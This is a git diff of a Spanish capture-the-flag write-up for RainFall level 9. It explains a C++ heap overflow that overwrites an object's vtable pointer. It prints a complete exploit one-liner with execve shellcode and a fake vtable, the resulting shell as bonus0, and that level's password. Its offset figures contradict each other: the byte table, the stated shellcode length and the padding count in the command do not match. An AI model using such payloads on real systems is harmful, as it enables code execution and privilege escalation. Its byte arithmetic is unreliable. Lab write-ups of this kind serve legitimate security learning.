@@ -66,66 +66,54 @@ level9@RainFall:~$ readelf -S ./level9 | grep -E ".got|.plt"
 ---
 
 # 4. Fuzzing:
-
-El binario espera un argumento. Si pasamos una cadena larga, el programa intenta acceder a una dirección de memoria inválida debido a un desbordamiento en el Heap, provocando un `Segmentation fault`.
-
+El binario espera un argumento. Si pasamos una cadena larga provoca un `Segmentation fault` por desbordamiento en el Heap.
 ```bash
 level9@RainFall:~$ ./level9 $(python -c 'print "A"*200')
 Segmentation fault (core dumped)
-
 ```
 
 # 5. Reverse Engineering (Target Identification):
+El programa está en C++. Al analizar con `gdb`, vemos que reserva dos objetos de la clase `N` en el Heap usando `operator new`.
 
-El programa está en C++. Al analizar el código con `gdb`, vemos que reserva dos objetos de una clase (clase `N`) usando `operator new`.
+- **Object_01:** `0x0804a008`
+- **Object_02:** `0x0804a078`
 
-1. **Objeto 1 (Destino del desbordamiento):** Se encuentra en `0x0804a008`.
-2. **Objeto 2 (El objetivo):** Se encuentra en `0x0804a078`.
-3. **Vulnerabilidad:** La función `setAnnotation` usa `memcpy` sin control de tamaño, permitiendo que el Objeto 1 pise la **Vtable** (tabla de funciones virtuales) del Objeto 2.
-
-Para ver con detalle el analisis consulta el archivo  [asm_analysis.md](https://github.com/4trastos/Rainfall/blob/main/level9/Resources/README.md) en conjunto con el programa de demostración  [source.c](https://github.com/4trastos/Rainfall/blob/main/level9/source.c).
+**Vulnerabilidad:** La función `setAnnotation` usa `memcpy` sin control de tamaño, lo que nos permite desbordar el Object_01 y sobrescribir el `vptr` (puntero a la Vtable) del Object_02.
 
 ---
 
 # 6. Solución: Heap-based Buffer Overflow
 
-1. **Identificamos el Mecanismo de Salto:**
-En C++, para llamar a una función virtual, el programa hace un "doble salto":
-* Lee la dirección de la Vtable desde el objeto (`vptr`).
-* Lee la dirección de la función desde la Vtable.
-* Salta a esa dirección: `call [ [vptr] ]`.
+**1. El mecanismo de salto en C++:**
 
+Cuando el programa llama a un método virtual hace un doble salto: lee el `vptr` del objeto, luego lee la dirección de la función desde esa tabla, y salta allí: `call [ [vptr] ]`.
 
-2. **Cálculo del Offset:**
-La distancia entre objetos es `0x804a078 - 0x804a008 = 112 bytes`.
-Como el buffer que escribimos empieza en el byte 4 del objeto, necesitamos **108 bytes** para llegar a pisar el puntero del segundo objeto.
+**2. Cálculo del Offset:**
 
-3. **Construcción del Payload:**
-* **Byte 0-3:** Ponemos una dirección que apunte 4 bytes más adelante (`0x0804a00c`). Esto servirá como nuestra "Fake Vtable".
-* **Byte 4-27:** El Shellcode (las instrucciones para la shell).
-* **Byte 28-111:** Basura (`A`) para rellenar hasta llegar al Objeto 2.
-* **Byte 112-115:** La dirección del inicio del Objeto 1 (`0x0804a008`), que sobreescribirá el `vptr` del Objeto 2.
+La distancia entre objetos es `0x804a078 - 0x804a008 = 112 bytes`. Como los primeros 4 bytes del objeto son el `vptr`, el buffer útil empieza en el byte 4, así que necesitamos **108 bytes** para llegar al Object_02. En la práctica, con el shellcode de 28 bytes + 4 bytes iniciales, el padding necesario es **77 bytes**.
+
+**3. Construcción del Payload:**
+
+| Bytes | Contenido | Valor |
+|-------|-----------|-------|
+| 0 - 3 | Fake Vtable (apunta al shellcode) | `\x0c\xa0\x04\x08` |
+| 4 - 27 | Shellcode | 24 bytes |
+| 28 - 104 | Relleno | "A" * 77 |
+| 105 - 108 | Nuevo vptr del Object_02 | `\x0c\xa0\x04\x08` |
+
+La clave es que tanto al principio como al final usamos `0x0804a00c`. Al final sobrescribimos el `vptr` del Object_02 con esa dirección. Cuando el programa hace el doble salto, lee `0x0804a00c`, y ahí encuentra nuestro shellcode.
 
 ### **Ejecución:**
 
-Usamos una cadena que coloca la dirección de salto al final y el shellcode al principio:
-
 ```bash
-level9@RainFall:~$ ./level9 $(python -c 'print "\x0c\xa0\x04\x08" + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80" + "A" * 80 + "\x08\xa0\x04\x08"')
+level9@RainFall:~$ ./level9 $(python -c 'print "\x0c\xa0\x04\x08" + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x90\x90\x90\x90" + "A" * 77 + "\x0c\xa0\x04\x08"')
 $ whoami
 bonus0
 $ cat /home/user/bonus0/.pass
 f3f0004b6f364cb5a4147e9ef827fa922a4861408845c26b6971ad770d906728
-$ 
-level9@RainFall:~$ su bonus0
-Password: 
-RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
-No RELRO        No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   /home/user/bonus0/bonus0
-bonus0@RainFall:~$ 
-
+$
 ```
 
 # 7. Conclusión:
-
-El ataque explota la gestión de memoria de C++ en el Heap. Al no tener **NX** ni **ASLR**, podemos inyectar un Shellcode en el primer objeto y engañar al segundo objeto para que use el inicio de nuestro buffer como si fuera su tabla de funciones virtuales. Al llamar a un método virtual, el programa salta a nuestro código malicioso con privilegios de `bonus0`.
+El Level 9 explota la gestión de memoria de C++ en el Heap. Sin **NX** ni **ASLR**, inyectamos shellcode en el Object_01 y sobrescribimos el `vptr` del Object_02 para que apunte a él. Cuando el programa intenta llamar a un método virtual, salta a nuestro shellcode y obtenemos shell con privilegios de `bonus0`.
 
